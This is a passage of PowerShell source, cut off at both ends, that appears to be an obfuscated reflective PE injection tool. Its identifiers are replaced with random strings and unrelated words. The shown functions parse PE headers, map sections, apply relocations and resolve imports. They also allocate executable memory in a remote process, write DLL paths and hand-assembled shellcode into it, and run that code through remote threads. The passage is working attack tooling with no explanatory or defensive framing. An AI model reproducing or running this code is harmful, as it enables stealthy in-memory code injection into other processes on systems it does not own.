        $PEInfo | Add-Member -MemberType NoteProperty -Name PEHandle -Value $BHTRESUz99
        $PEInfo | Add-Member -MemberType NoteProperty -Name IMAGE_NT_HEADERS -Value ($ciasFrCj99.IMAGE_NT_HEADERS)
        $PEInfo | Add-Member -MemberType NoteProperty -Name NtHeadersPtr -Value ($ciasFrCj99.NtHeadersPtr)
        $PEInfo | Add-Member -MemberType NoteProperty -Name PE64Bit -Value ($ciasFrCj99.PE64Bit)
        $PEInfo | Add-Member -MemberType NoteProperty -Name 'SizeOfImage' -Value ($ciasFrCj99.IMAGE_NT_HEADERS.OptionalHeader.SizeOfImage)

        if ($PEInfo.PE64Bit -eq $true)
        {
            [IntPtr]$JHgDvnfs99 = [IntPtr](recessives ([Int64]$PEInfo.NtHeadersPtr) ([System.Runtime.InteropServices.Marshal]::SizeOf([Type]$TIzknaum99.IMAGE_NT_HEADERS64)))
            $PEInfo | Add-Member -MemberType NoteProperty -Name SectionHeaderPtr -Value $JHgDvnfs99
        }
        else
        {
            [IntPtr]$JHgDvnfs99 = [IntPtr](recessives ([Int64]$PEInfo.NtHeadersPtr) ([System.Runtime.InteropServices.Marshal]::SizeOf([Type]$TIzknaum99.IMAGE_NT_HEADERS32)))
            $PEInfo | Add-Member -MemberType NoteProperty -Name SectionHeaderPtr -Value $JHgDvnfs99
        }

        if (($ciasFrCj99.IMAGE_NT_HEADERS.FileHeader.Characteristics -band $Win32Constants.IMAGE_FILE_DLL) -eq $Win32Constants.IMAGE_FILE_DLL)
        {
            $PEInfo | Add-Member -MemberType NoteProperty -Name FileType -Value 'DLL'
        }
        elseif (($ciasFrCj99.IMAGE_NT_HEADERS.FileHeader.Characteristics -band $Win32Constants.IMAGE_FILE_EXECUTABLE_IMAGE) -eq $Win32Constants.IMAGE_FILE_EXECUTABLE_IMAGE)
        {
            $PEInfo | Add-Member -MemberType NoteProperty -Name FileType -Value 'EXE'
        }
        else
        {
            Throw "PE file is not an EXE or DLL"
        }

        return $PEInfo
    }

    Function Pershing
    {
        Param(
        [Parameter(Position=0, Mandatory=$true)]
        [IntPtr]
        $zBmOaylB99,

        [Parameter(Position=1, Mandatory=$true)]
        [IntPtr]
        $bxtUISCA99
        )

        $UHcuXCBr99 = [System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr])

        $hlhZttsE99 = [System.Runtime.InteropServices.Marshal]::PtrToStringAnsi($bxtUISCA99)
        $IDcDlfaX99 = [UIntPtr][UInt64]([UInt64]$hlhZttsE99.Length + 1)
        $PcZLsmtt99 = $dxaeqnSI99.VirtualAllocEx.Invoke($zBmOaylB99, [IntPtr]::Zero, $IDcDlfaX99, $Win32Constants.MEM_COMMIT -bor $Win32Constants.MEM_RESERVE, $Win32Constants.PAGE_READWRITE)
        if ($PcZLsmtt99 -eq [IntPtr]::Zero)
        {
            Throw "Unable to allocate memory in the remote process"
        }

        [UIntPtr]$ItcHywgU99 = [UIntPtr]::Zero
        $lKwXcapb99 = $dxaeqnSI99.WriteProcessMemory.Invoke($zBmOaylB99, $PcZLsmtt99, $bxtUISCA99, $IDcDlfaX99, [Ref]$ItcHywgU99)

        if ($lKwXcapb99 -eq $false)
        {
            Throw "Unable to write DLL path to remote process memory"
        }
        if ($IDcDlfaX99 -ne $ItcHywgU99)
        {
            Throw "Didn't write the expected amount of bytes when writing a DLL path to load to the remote process"
        }

        $TPnufisc99 = $dxaeqnSI99.GetModuleHandle.Invoke("kernel32.dll")
        $tvCkGCVz99 = $dxaeqnSI99.GetProcAddress.Invoke($TPnufisc99, "LoadLibraryA") #Kernel32 loaded to the same address for all processes

        [IntPtr]$eqbpuAhA99 = [IntPtr]::Zero
        if ($PEInfo.PE64Bit -eq $true)
        {
            $EbjFXcdo99 = $dxaeqnSI99.VirtualAllocEx.Invoke($zBmOaylB99, [IntPtr]::Zero, $IDcDlfaX99, $Win32Constants.MEM_COMMIT -bor $Win32Constants.MEM_RESERVE, $Win32Constants.PAGE_READWRITE)
            if ($EbjFXcdo99 -eq [IntPtr]::Zero)
            {
                Throw "Unable to allocate memory in the remote process for the return value of LoadLibraryA"
            }

            $UPiJEBLx99 = @(0x53, 0x48, 0x89, 0xe3, 0x48, 0x83, 0xec, 0x20, 0x66, 0x83, 0xe4, 0xc0, 0x48, 0xb9)
            $TQZQUFnf99 = @(0x48, 0xba)
            $ttHFnlDP99 = @(0xff, 0xd2, 0x48, 0xba)
            $XbffYExk99 = @(0x48, 0x89, 0x02, 0x48, 0x89, 0xdc, 0x5b, 0xc3)

            $HgkmYpqK99 = $UPiJEBLx99.Length + $TQZQUFnf99.Length + $ttHFnlDP99.Length + $XbffYExk99.Length + ($UHcuXCBr99 * 3)
            $kFjtVfJG99 = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($HgkmYpqK99)
            $nyECfWXV99 = $kFjtVfJG99

            clothespin -Bytes $UPiJEBLx99 -pvgFYwns99 $kFjtVfJG99
            $kFjtVfJG99 = recessives $kFjtVfJG99 ($UPiJEBLx99.Length)
            [System.Runtime.InteropServices.Marshal]::StructureToPtr($PcZLsmtt99, $kFjtVfJG99, $false)
            $kFjtVfJG99 = recessives $kFjtVfJG99 ($UHcuXCBr99)
            clothespin -Bytes $TQZQUFnf99 -pvgFYwns99 $kFjtVfJG99
            $kFjtVfJG99 = recessives $kFjtVfJG99 ($TQZQUFnf99.Length)
            [System.Runtime.InteropServices.Marshal]::StructureToPtr($tvCkGCVz99, $kFjtVfJG99, $false)
            $kFjtVfJG99 = recessives $kFjtVfJG99 ($UHcuXCBr99)
            clothespin -Bytes $ttHFnlDP99 -pvgFYwns99 $kFjtVfJG99
            $kFjtVfJG99 = recessives $kFjtVfJG99 ($ttHFnlDP99.Length)
            [System.Runtime.InteropServices.Marshal]::StructureToPtr($EbjFXcdo99, $kFjtVfJG99, $false)
            $kFjtVfJG99 = recessives $kFjtVfJG99 ($UHcuXCBr99)
            clothespin -Bytes $XbffYExk99 -pvgFYwns99 $kFjtVfJG99
            $kFjtVfJG99 = recessives $kFjtVfJG99 ($XbffYExk99.Length)

            $LNpFfeQJ99 = $dxaeqnSI99.VirtualAllocEx.Invoke($zBmOaylB99, [IntPtr]::Zero, [UIntPtr][UInt64]$HgkmYpqK99, $Win32Constants.MEM_COMMIT -bor $Win32Constants.MEM_RESERVE, $Win32Constants.PAGE_EXECUTE_READWRITE)
            if ($LNpFfeQJ99 -eq [IntPtr]::Zero)
            {
                Throw "Unable to allocate memory in the remote process for shellcode"
            }

            $lKwXcapb99 = $dxaeqnSI99.WriteProcessMemory.Invoke($zBmOaylB99, $LNpFfeQJ99, $nyECfWXV99, [UIntPtr][UInt64]$HgkmYpqK99, [Ref]$ItcHywgU99)
            if (($lKwXcapb99 -eq $false) -or ([UInt64]$ItcHywgU99 -ne [UInt64]$HgkmYpqK99))
            {
                Throw "Unable to write shellcode to remote process memory."
            }

            $MfVedyeN99 = indissoluble -blAqmNlp99 $zBmOaylB99 -StartAddress $LNpFfeQJ99 -dxaeqnSI99 $dxaeqnSI99
            $RWrGHNur99 = $dxaeqnSI99.WaitForSingleObject.Invoke($MfVedyeN99, 20000)
            if ($RWrGHNur99 -ne 0)
            {
                Throw "Call to CreateRemoteThread to call GetProcAddress failed."
            }

            [IntPtr]$MeehGemE99 = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($UHcuXCBr99)
            $RWrGHNur99 = $dxaeqnSI99.ReadProcessMemory.Invoke($zBmOaylB99, $EbjFXcdo99, $MeehGemE99, [UIntPtr][UInt64]$UHcuXCBr99, [Ref]$ItcHywgU99)
            if ($RWrGHNur99 -eq $false)
            {
                Throw "Call to ReadProcessMemory failed"
            }
            [IntPtr]$eqbpuAhA99 = [System.Runtime.InteropServices.Marshal]::PtrToStructure($MeehGemE99, [Type][IntPtr])

            $dxaeqnSI99.VirtualFreeEx.Invoke($zBmOaylB99, $EbjFXcdo99, [UIntPtr][UInt64]0, $Win32Constants.MEM_RELEASE) | Out-Null
            $dxaeqnSI99.VirtualFreeEx.Invoke($zBmOaylB99, $LNpFfeQJ99, [UIntPtr][UInt64]0, $Win32Constants.MEM_RELEASE) | Out-Null
        }
        else
        {
            [IntPtr]$MfVedyeN99 = indissoluble -blAqmNlp99 $zBmOaylB99 -StartAddress $tvCkGCVz99 -iglcbndz99 $PcZLsmtt99 -dxaeqnSI99 $dxaeqnSI99
            $RWrGHNur99 = $dxaeqnSI99.WaitForSingleObject.Invoke($MfVedyeN99, 20000)
            if ($RWrGHNur99 -ne 0)
            {
                Throw "Call to CreateRemoteThread to call GetProcAddress failed."
            }

            [Int32]$QLKBpdJw99 = 0
            $RWrGHNur99 = $dxaeqnSI99.GetExitCodeThread.Invoke($MfVedyeN99, [Ref]$QLKBpdJw99)
            if (($RWrGHNur99 -eq 0) -or ($QLKBpdJw99 -eq 0))
            {
                Throw "Call to GetExitCodeThread failed"
            }

            [IntPtr]$eqbpuAhA99 = [IntPtr]$QLKBpdJw99
        }

        $dxaeqnSI99.VirtualFreeEx.Invoke($zBmOaylB99, $PcZLsmtt99, [UIntPtr][UInt64]0, $Win32Constants.MEM_RELEASE) | Out-Null

        return $eqbpuAhA99
    }

    Function touchdown
    {
        Param(
        [Parameter(Position=0, Mandatory=$true)]
        [IntPtr]
        $zBmOaylB99,

        [Parameter(Position=1, Mandatory=$true)]
        [IntPtr]
        $YgqUqMfw99,

        [Parameter(Position=2, Mandatory=$true)]
        [IntPtr]
        $hkajqGhY99,#This can either be a ptr to a string which is the function name, or, if LoadByOrdinal is 'true' this is an ordinal number (points to nothing)

        [Parameter(Position=3, Mandatory=$true)]
        [Bool]
        $VwyGnQbs99
        )

        $UHcuXCBr99 = [System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr])

        [IntPtr]$SAUnMyAT99 = [IntPtr]::Zero   #Pointer to the function name in remote process memory if loading by function name, ordinal number if loading by ordinal
        if (-not $VwyGnQbs99)
        {
            $FunctionName = [System.Runtime.InteropServices.Marshal]::PtrToStringAnsi($hkajqGhY99)

            $aZDNFWDt99 = [UIntPtr][UInt64]([UInt64]$FunctionName.Length + 1)
            $SAUnMyAT99 = $dxaeqnSI99.VirtualAllocEx.Invoke($zBmOaylB99, [IntPtr]::Zero, $aZDNFWDt99, $Win32Constants.MEM_COMMIT -bor $Win32Constants.MEM_RESERVE, $Win32Constants.PAGE_READWRITE)
            if ($SAUnMyAT99 -eq [IntPtr]::Zero)
            {
                Throw "Unable to allocate memory in the remote process"
            }

            [UIntPtr]$ItcHywgU99 = [UIntPtr]::Zero
            $lKwXcapb99 = $dxaeqnSI99.WriteProcessMemory.Invoke($zBmOaylB99, $SAUnMyAT99, $hkajqGhY99, $aZDNFWDt99, [Ref]$ItcHywgU99)
            if ($lKwXcapb99 -eq $false)
            {
                Throw "Unable to write DLL path to remote process memory"
            }
            if ($aZDNFWDt99 -ne $ItcHywgU99)
            {
                Throw "Didn't write the expected amount of bytes when writing a DLL path to load to the remote process"
            }
        }
        else
        {
            $SAUnMyAT99 = $hkajqGhY99
        }

        $TPnufisc99 = $dxaeqnSI99.GetModuleHandle.Invoke("kernel32.dll")
        $BKBvZrYm99 = $dxaeqnSI99.GetProcAddress.Invoke($TPnufisc99, "GetProcAddress") #Kernel32 loaded to the same address for all processes

        $cJsOZYXX99 = $dxaeqnSI99.VirtualAllocEx.Invoke($zBmOaylB99, [IntPtr]::Zero, [UInt64][UInt64]$UHcuXCBr99, $Win32Constants.MEM_COMMIT -bor $Win32Constants.MEM_RESERVE, $Win32Constants.PAGE_READWRITE)
        if ($cJsOZYXX99 -eq [IntPtr]::Zero)
        {
            Throw "Unable to allocate memory in the remote process for the return value of GetProcAddress"
        }

        [Byte[]]$biuKwpbt99 = @()
        if ($PEInfo.PE64Bit -eq $true)
        {
            $MkaPwFWD99 = @(0x53, 0x48, 0x89, 0xe3, 0x48, 0x83, 0xec, 0x20, 0x66, 0x83, 0xe4, 0xc0, 0x48, 0xb9)
            $PVKnkDqh99 = @(0x48, 0xba)
            $nXUnBDBt99 = @(0x48, 0xb8)
            $BoTQDtJW99 = @(0xff, 0xd0, 0x48, 0xb9)
            $KvxUAIcL99 = @(0x48, 0x89, 0x01, 0x48, 0x89, 0xdc, 0x5b, 0xc3)
        }
        else
        {
            $MkaPwFWD99 = @(0x53, 0x89, 0xe3, 0x83, 0xe4, 0xc0, 0xb8)
            $PVKnkDqh99 = @(0xb9)
            $nXUnBDBt99 = @(0x51, 0x50, 0xb8)
            $BoTQDtJW99 = @(0xff, 0xd0, 0xb9)
            $KvxUAIcL99 = @(0x89, 0x01, 0x89, 0xdc, 0x5b, 0xc3)
        }
        $HgkmYpqK99 = $MkaPwFWD99.Length + $PVKnkDqh99.Length + $nXUnBDBt99.Length + $BoTQDtJW99.Length + $KvxUAIcL99.Length + ($UHcuXCBr99 * 4)
        $kFjtVfJG99 = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($HgkmYpqK99)
        $nyECfWXV99 = $kFjtVfJG99

        clothespin -Bytes $MkaPwFWD99 -pvgFYwns99 $kFjtVfJG99
        $kFjtVfJG99 = recessives $kFjtVfJG99 ($MkaPwFWD99.Length)
        [System.Runtime.InteropServices.Marshal]::StructureToPtr($YgqUqMfw99, $kFjtVfJG99, $false)
        $kFjtVfJG99 = recessives $kFjtVfJG99 ($UHcuXCBr99)
        clothespin -Bytes $PVKnkDqh99 -pvgFYwns99 $kFjtVfJG99
        $kFjtVfJG99 = recessives $kFjtVfJG99 ($PVKnkDqh99.Length)
        [System.Runtime.InteropServices.Marshal]::StructureToPtr($SAUnMyAT99, $kFjtVfJG99, $false)
        $kFjtVfJG99 = recessives $kFjtVfJG99 ($UHcuXCBr99)
        clothespin -Bytes $nXUnBDBt99 -pvgFYwns99 $kFjtVfJG99
        $kFjtVfJG99 = recessives $kFjtVfJG99 ($nXUnBDBt99.Length)
        [System.Runtime.InteropServices.Marshal]::StructureToPtr($BKBvZrYm99, $kFjtVfJG99, $false)
        $kFjtVfJG99 = recessives $kFjtVfJG99 ($UHcuXCBr99)
        clothespin -Bytes $BoTQDtJW99 -pvgFYwns99 $kFjtVfJG99
        $kFjtVfJG99 = recessives $kFjtVfJG99 ($BoTQDtJW99.Length)
        [System.Runtime.InteropServices.Marshal]::StructureToPtr($cJsOZYXX99, $kFjtVfJG99, $false)
        $kFjtVfJG99 = recessives $kFjtVfJG99 ($UHcuXCBr99)
        clothespin -Bytes $KvxUAIcL99 -pvgFYwns99 $kFjtVfJG99
        $kFjtVfJG99 = recessives $kFjtVfJG99 ($KvxUAIcL99.Length)

        $LNpFfeQJ99 = $dxaeqnSI99.VirtualAllocEx.Invoke($zBmOaylB99, [IntPtr]::Zero, [UIntPtr][UInt64]$HgkmYpqK99, $Win32Constants.MEM_COMMIT -bor $Win32Constants.MEM_RESERVE, $Win32Constants.PAGE_EXECUTE_READWRITE)
        if ($LNpFfeQJ99 -eq [IntPtr]::Zero)
        {
            Throw "Unable to allocate memory in the remote process for shellcode"
        }
        [UIntPtr]$ItcHywgU99 = [UIntPtr]::Zero
        $lKwXcapb99 = $dxaeqnSI99.WriteProcessMemory.Invoke($zBmOaylB99, $LNpFfeQJ99, $nyECfWXV99, [UIntPtr][UInt64]$HgkmYpqK99, [Ref]$ItcHywgU99)
        if (($lKwXcapb99 -eq $false) -or ([UInt64]$ItcHywgU99 -ne [UInt64]$HgkmYpqK99))
        {
            Throw "Unable to write shellcode to remote process memory."
        }

        $MfVedyeN99 = indissoluble -blAqmNlp99 $zBmOaylB99 -StartAddress $LNpFfeQJ99 -dxaeqnSI99 $dxaeqnSI99
        $RWrGHNur99 = $dxaeqnSI99.WaitForSingleObject.Invoke($MfVedyeN99, 20000)
        if ($RWrGHNur99 -ne 0)
        {
            Throw "Call to CreateRemoteThread to call GetProcAddress failed."
        }

        [IntPtr]$MeehGemE99 = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($UHcuXCBr99)
        $RWrGHNur99 = $dxaeqnSI99.ReadProcessMemory.Invoke($zBmOaylB99, $cJsOZYXX99, $MeehGemE99, [UIntPtr][UInt64]$UHcuXCBr99, [Ref]$ItcHywgU99)
        if (($RWrGHNur99 -eq $false) -or ($ItcHywgU99 -eq 0))
        {
            Throw "Call to ReadProcessMemory failed"
        }
        [IntPtr]$RyloKvrB99 = [System.Runtime.InteropServices.Marshal]::PtrToStructure($MeehGemE99, [Type][IntPtr])

        $dxaeqnSI99.VirtualFreeEx.Invoke($zBmOaylB99, $LNpFfeQJ99, [UIntPtr][UInt64]0, $Win32Constants.MEM_RELEASE) | Out-Null
        $dxaeqnSI99.VirtualFreeEx.Invoke($zBmOaylB99, $cJsOZYXX99, [UIntPtr][UInt64]0, $Win32Constants.MEM_RELEASE) | Out-Null

        if (-not $VwyGnQbs99)
        {
            $dxaeqnSI99.VirtualFreeEx.Invoke($zBmOaylB99, $SAUnMyAT99, [UIntPtr][UInt64]0, $Win32Constants.MEM_RELEASE) | Out-Null
        }

        return $RyloKvrB99
    }


    Function paratroops
    {
        Param(
        [Parameter(Position = 0, Mandatory = $true)]
        [Byte[]]
        $mhtSMDwv99,

        [Parameter(Position = 1, Mandatory = $true)]
        [System.Object]
        $PEInfo,

        [Parameter(Position = 2, Mandatory = $true)]
        [System.Object]
        $dxaeqnSI99,

        [Parameter(Position = 3, Mandatory = $true)]
        [System.Object]
        $TIzknaum99
        )

        for( $i = 0; $i -lt $PEInfo.IMAGE_NT_HEADERS.FileHeader.NumberOfSections; $i++)
        {
            [IntPtr]$JHgDvnfs99 = [IntPtr](recessives ([Int64]$PEInfo.SectionHeaderPtr) ($i * [System.Runtime.InteropServices.Marshal]::SizeOf([Type]$TIzknaum99.IMAGE_SECTION_HEADER)))
            $HuezbtQs99 = [System.Runtime.InteropServices.Marshal]::PtrToStructure($JHgDvnfs99, [Type]$TIzknaum99.IMAGE_SECTION_HEADER)

            [IntPtr]$UsYpBgHS99 = [IntPtr](recessives ([Int64]$PEInfo.PEHandle) ([Int64]$HuezbtQs99.VirtualAddress))

            $TlPhXzIX99 = $HuezbtQs99.SizeOfRawData

            if ($HuezbtQs99.PointerToRawData -eq 0)
            {
                $TlPhXzIX99 = 0
            }

            if ($TlPhXzIX99 -gt $HuezbtQs99.VirtualSize)
            {
                $TlPhXzIX99 = $HuezbtQs99.VirtualSize
            }

            if ($TlPhXzIX99 -gt 0)
            {
                aspire -FhIFlHBg99 "paratroops::MarshalCopy" -PEInfo $PEInfo -StartAddress $UsYpBgHS99 -Size $TlPhXzIX99 | Out-Null
                [System.Runtime.InteropServices.Marshal]::Copy($mhtSMDwv99, [Int32]$HuezbtQs99.PointerToRawData, $UsYpBgHS99, $TlPhXzIX99)
            }

            if ($HuezbtQs99.SizeOfRawData -lt $HuezbtQs99.VirtualSize)
            {
                $VXQgpxcx99 = $HuezbtQs99.VirtualSize - $TlPhXzIX99
                [IntPtr]$StartAddress = [IntPtr](recessives ([Int64]$UsYpBgHS99) ([Int64]$TlPhXzIX99))
                aspire -FhIFlHBg99 "paratroops::Memset" -PEInfo $PEInfo -StartAddress $StartAddress -Size $VXQgpxcx99 | Out-Null
                $dxaeqnSI99.memset.Invoke($StartAddress, 0, [IntPtr]$VXQgpxcx99) | Out-Null
            }
        }
    }


    Function compatibly
    {
        Param(
        [Parameter(Position = 0, Mandatory = $true)]
        [System.Object]
        $PEInfo,

        [Parameter(Position = 1, Mandatory = $true)]
        [Int64]
        $rKrqCnuN99,

        [Parameter(Position = 2, Mandatory = $true)]
        [System.Object]
        $Win32Constants,

        [Parameter(Position = 3, Mandatory = $true)]
        [System.Object]
        $TIzknaum99
        )

        [Int64]$NlEvdXWw99 = 0
        $rsbAmMYJ99 = $true #Track if the difference variable should be added or subtracted from variables
        [UInt32]$gDiEpSvp99 = [System.Runtime.InteropServices.Marshal]::SizeOf([Type]$TIzknaum99.IMAGE_BASE_RELOCATION)

        if (($rKrqCnuN99 -eq [Int64]$PEInfo.EffectivePEHandle) `
                -or ($PEInfo.IMAGE_NT_HEADERS.OptionalHeader.BaseRelocationTable.Size -eq 0))
        {
            return
        }


        elseif ((Fischer ($rKrqCnuN99) ($PEInfo.EffectivePEHandle)) -eq $true)
        {
            $NlEvdXWw99 = timelines ($rKrqCnuN99) ($PEInfo.EffectivePEHandle)
            $rsbAmMYJ99 = $false
        }
        elseif ((Fischer ($PEInfo.EffectivePEHandle) ($rKrqCnuN99)) -eq $true)
        {
            $NlEvdXWw99 = timelines ($PEInfo.EffectivePEHandle) ($rKrqCnuN99)
        }

        [IntPtr]$AmSvIojO99 = [IntPtr](recessives ([Int64]$PEInfo.PEHandle) ([Int64]$PEInfo.IMAGE_NT_HEADERS.OptionalHeader.BaseRelocationTable.VirtualAddress))
        while($true)
        {
            $hMrMgniA99 = [System.Runtime.InteropServices.Marshal]::PtrToStructure($AmSvIojO99, [Type]$TIzknaum99.IMAGE_BASE_RELOCATION)

            if ($hMrMgniA99.SizeOfBlock -eq 0)
            {
                break
            }

            [IntPtr]$yfCFIVbQ99 = [IntPtr](recessives ([Int64]$PEInfo.PEHandle) ([Int64]$hMrMgniA99.VirtualAddress))
            $YYyOwazZ99 = ($hMrMgniA99.SizeOfBlock - $gDiEpSvp99) / 2

            for($i = 0; $i -lt $YYyOwazZ99; $i++)
            {
                $zokSgvsK99 = [IntPtr](recessives ([IntPtr]$AmSvIojO99) ([Int64]$gDiEpSvp99 + (2 * $i)))
                [UInt16]$KAILAeDm99 = [System.Runtime.InteropServices.Marshal]::PtrToStructure($zokSgvsK99, [Type][UInt16])

                [UInt16]$RtiLIFIR99 = $KAILAeDm99 -band 0x0FFF
                [UInt16]$GjzKCBGj99 = $KAILAeDm99 -band 0xF000
                for ($j = 0; $j -lt 12; $j++)
                {
                    $GjzKCBGj99 = [Math]::Floor($GjzKCBGj99 / 2)
                }

                if (($GjzKCBGj99 -eq $Win32Constants.IMAGE_REL_BASED_HIGHLOW) `
                        -or ($GjzKCBGj99 -eq $Win32Constants.IMAGE_REL_BASED_DIR64))
                {
                    [IntPtr]$HMVsSokd99 = [IntPtr](recessives ([Int64]$yfCFIVbQ99) ([Int64]$RtiLIFIR99))
                    [IntPtr]$HUKbHZWR99 = [System.Runtime.InteropServices.Marshal]::PtrToStructure($HMVsSokd99, [Type][IntPtr])

                    if ($rsbAmMYJ99 -eq $true)
                    {
                        [IntPtr]$HUKbHZWR99 = [IntPtr](recessives ([Int64]$HUKbHZWR99) ($NlEvdXWw99))
                    }
                    else
                    {
                        [IntPtr]$HUKbHZWR99 = [IntPtr](timelines ([Int64]$HUKbHZWR99) ($NlEvdXWw99))
                    }

                    [System.Runtime.InteropServices.Marshal]::StructureToPtr($HUKbHZWR99, $HMVsSokd99, $false) | Out-Null
                }
                elseif ($GjzKCBGj99 -ne $Win32Constants.IMAGE_REL_BASED_ABSOLUTE)
                {
                    Throw "Unknown relocation found, relocation value: $GjzKCBGj99, relocationinfo: $KAILAeDm99"
                }
            }

            $AmSvIojO99 = [IntPtr](recessives ([Int64]$AmSvIojO99) ([Int64]$hMrMgniA99.SizeOfBlock))
        }
    }


    Function index
    {
        Param(
        [Parameter(Position = 0, Mandatory = $true)]
        [System.Object]
        $PEInfo,

        [Parameter(Position = 1, Mandatory = $true)]
        [System.Object]
        $dxaeqnSI99,

        [Parameter(Position = 2, Mandatory = $true)]
        [System.Object]
        $TIzknaum99,

        [Parameter(Position = 3, Mandatory = $true)]
        [System.Object]
        $Win32Constants,

        [Parameter(Position = 4, Mandatory = $false)]
        [IntPtr]
        $zBmOaylB99
        )

        $OumnXgDL99 = $false
        if ($PEInfo.PEHandle -ne $PEInfo.EffectivePEHandle)
        {
            $OumnXgDL99 = $true
        }

        if ($PEInfo.IMAGE_NT_HEADERS.OptionalHeader.ImportTable.Size -gt 0)
        {
            [IntPtr]$yZlaaofg99 = recessives ([Int64]$PEInfo.PEHandle) ([Int64]$PEInfo.IMAGE_NT_HEADERS.OptionalHeader.ImportTable.VirtualAddress)

            while ($true)
            {
                $KytvNJgL99 = [System.Runtime.InteropServices.Marshal]::PtrToStructure($yZlaaofg99, [Type]$TIzknaum99.IMAGE_IMPORT_DESCRIPTOR)

                if ($KytvNJgL99.Characteristics -eq 0 `
                        -and $KytvNJgL99.FirstThunk -eq 0 `
                        -and $KytvNJgL99.ForwarderChain -eq 0 `
                        -and $KytvNJgL99.Name -eq 0 `
                        -and $KytvNJgL99.TimeDateStamp -eq 0)
                {
                    Write-Verbose "Done importing DLL imports"
                    break
                }

                $tBdAUFcc99 = [IntPtr]::Zero
                $bxtUISCA99 = (recessives ([Int64]$PEInfo.PEHandle) ([Int64]$KytvNJgL99.Name))
                $hlhZttsE99 = [System.Runtime.InteropServices.Marshal]::PtrToStringAnsi($bxtUISCA99)

                if ($OumnXgDL99 -eq $true)
                {
                    $tBdAUFcc99 = Pershing -zBmOaylB99 $zBmOaylB99 -bxtUISCA99 $bxtUISCA99
                }
                else
                {
                    $tBdAUFcc99 = $dxaeqnSI99.LoadLibrary.Invoke($hlhZttsE99)
                }

                if (($tBdAUFcc99 -eq $null) -or ($tBdAUFcc99 -eq [IntPtr]::Zero))
                {
                    throw "Error importing DLL, DLLName: $hlhZttsE99"
                }

                [IntPtr]$eRzSFbzR99 = recessives ($PEInfo.PEHandle) ($KytvNJgL99.FirstThunk)
                [IntPtr]$DvCSeKoH99 = recessives ($PEInfo.PEHandle) ($KytvNJgL99.Characteristics) #Characteristics is overloaded with OriginalFirstThunk
                [IntPtr]$QDPHdXtz99 = [System.Runtime.InteropServices.Marshal]::PtrToStructure($DvCSeKoH99, [Type][IntPtr])

                while ($QDPHdXtz99 -ne [IntPtr]::Zero)
                {
                    $VwyGnQbs99 = $false
                    [IntPtr]$qyvNIknA99 = [IntPtr]::Zero
                    [IntPtr]$QlfdMhBM99 = [IntPtr]::Zero
                    if([System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr]) -eq 4 -and [Int32]$QDPHdXtz99 -lt 0)
                    {
                        [IntPtr]$qyvNIknA99 = [IntPtr]$QDPHdXtz99 -band 0xffff #This is actually a lookup by ordinal
                        $VwyGnQbs99 = $true
                    }
                    elseif([System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr]) -eq 8 -and [Int64]$QDPHdXtz99 -lt 0)
                    {
                        [IntPtr]$qyvNIknA99 = [Int64]$QDPHdXtz99 -band 0xffff #This is actually a lookup by ordinal
                        $VwyGnQbs99 = $true
                    }
                    else
                    {
                        [IntPtr]$AlgQTGHQ99 = recessives ($PEInfo.PEHandle) ($QDPHdXtz99)
                        $AlgQTGHQ99 = recessives $AlgQTGHQ99 ([System.Runtime.InteropServices.Marshal]::SizeOf([Type][UInt16]))
                        $OEkgexfH99 = [System.Runtime.InteropServices.Marshal]::PtrToStringAnsi($AlgQTGHQ99)
                        $qyvNIknA99 = [System.Runtime.InteropServices.Marshal]::StringToHGlobalAnsi($OEkgexfH99)
                    }

                    if ($OumnXgDL99 -eq $true)
                    {
                        [IntPtr]$QlfdMhBM99 = touchdown -zBmOaylB99 $zBmOaylB99 -YgqUqMfw99 $tBdAUFcc99 -hkajqGhY99 $qyvNIknA99 -VwyGnQbs99 $VwyGnQbs99
                    }
                    else
                    {
                        [IntPtr]$QlfdMhBM99 = $dxaeqnSI99.GetProcAddressIntPtr.Invoke($tBdAUFcc99, $qyvNIknA99)
                    }

                    if ($QlfdMhBM99 -eq $null -or $QlfdMhBM99 -eq [IntPtr]::Zero)
                    {
                        if ($VwyGnQbs99)
                        {
                            Throw "New function reference is null, this is almost certainly a bug in this script. Function Ordinal: $qyvNIknA99. Dll: $hlhZttsE99"
                        }
                        else
                        {
                            Throw "New function reference is null, this is almost certainly a bug in this script. Function: $OEkgexfH99. Dll: $hlhZttsE99"
                        }
                    }

                    [System.Runtime.InteropServices.Marshal]::StructureToPtr($QlfdMhBM99, $eRzSFbzR99, $false)

                    $eRzSFbzR99 = recessives ([Int64]$eRzSFbzR99) ([System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr]))
                    [IntPtr]$DvCSeKoH99 = recessives ([Int64]$DvCSeKoH99) ([System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr]))
                    [IntPtr]$QDPHdXtz99 = [System.Runtime.InteropServices.Marshal]::PtrToStructure($DvCSeKoH99, [Type][IntPtr])

                    if ((-not $VwyGnQbs99) -and ($qyvNIknA99 -ne [IntPtr]::Zero))
                    {
                        [System.Runtime.InteropServices.Marshal]::FreeHGlobal($qyvNIknA99)
                        $qyvNIknA99 = [IntPtr]::Zero
                    }
                }

                $yZlaaofg99 = recessives ($yZlaaofg99) ([System.Runtime.InteropServices.Marshal]::SizeOf([Type]$TIzknaum99.IMAGE_IMPORT_DESCRIPTOR))
            }
        }
    }

    Function cutthroat
    {
        Param(
        [Parameter(Position = 0, Mandatory = $true)]
        [UInt32]
        $lAzRMYMK99
        )

        $vjVgHLvf99 = 0x0
        if (($lAzRMYMK99 -band $Win32Constants.IMAGE_SCN_MEM_EXECUTE) -gt 0)
        {
            if (($lAzRMYMK99 -band $Win32Constants.IMAGE_SCN_MEM_READ) -gt 0)
            {
                if (($lAzRMYMK99 -band $Win32Constants.IMAGE_SCN_MEM_WRITE) -gt 0)
                {
                    $vjVgHLvf99 = $Win32Constants.PAGE_EXECUTE_READWRITE
                }
                else
                {
                    $vjVgHLvf99 = $Win32Constants.PAGE_EXECUTE_READ
                }
            }
            else
            {
                if (($lAzRMYMK99 -band $Win32Constants.IMAGE_SCN_MEM_WRITE) -gt 0)
                {
                    $vjVgHLvf99 = $Win32Constants.PAGE_EXECUTE_WRITECOPY
                }
                else
                {
                    $vjVgHLvf99 = $Win32Constants.PAGE_EXECUTE
                }
            }
        }
